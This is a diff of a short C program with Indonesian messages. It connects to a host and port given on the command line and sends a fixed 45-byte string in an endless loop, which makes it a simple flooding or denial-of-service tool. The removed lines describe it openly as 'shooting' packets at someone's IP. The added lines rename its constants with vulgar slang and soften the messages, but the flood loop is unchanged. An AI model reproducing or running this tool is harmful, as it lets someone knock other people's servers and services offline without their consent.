@@ -4,8 +4,8 @@
 #include <netinet/in.h>
 #include <netdb.h>
 #include <stdarg.h>
-#define JENIS_PELURU "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-#define UKURAN_PELURU 45
+#define JENIS_Peler "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+#define UKURAN_PELER 45
 
 int echo_connect(char *, short);
 int echo_connect(char *server, short port)
@@ -14,11 +14,11 @@ struct sockaddr_in sin;
 struct hostent *hp;
 int thesock;
 printf("\n");
-printf("l33nux..!!!! Tembaaaak %s ke port %d\n",
+printf("Jajal %s ke port %d\n",
 server, port);
 hp = gethostbyname(server);
 if (hp==NULL) {
-printf("Di %s gak ada sasaran, Boss!!\n",server);
+printf("Di %s Qe3!!\n",server);
 printf("\n");
 exit(0);
 }
@@ -40,14 +40,14 @@ int s;
 if(argc != 3)
 {
 printf("\n");
-printf("Kirim Paket ke IP orang\n\n");
-printf("Cara Pake : $ tembak hostname.orang port \n\n");
+printf("Kirim Voucher\n\n");
+printf("Cara Pake : $ qe3 ip port \n\n");
 exit(0);
 }
 s=echo_connect(argv[1], atoi(argv[2]));
 for(;;)
 {
-send(s, JENIS_PELURU, UKURAN_PELURU, 0);
+send(s, JENIS_Peler, UKURAN_PELER, 0);
 }
 }
 
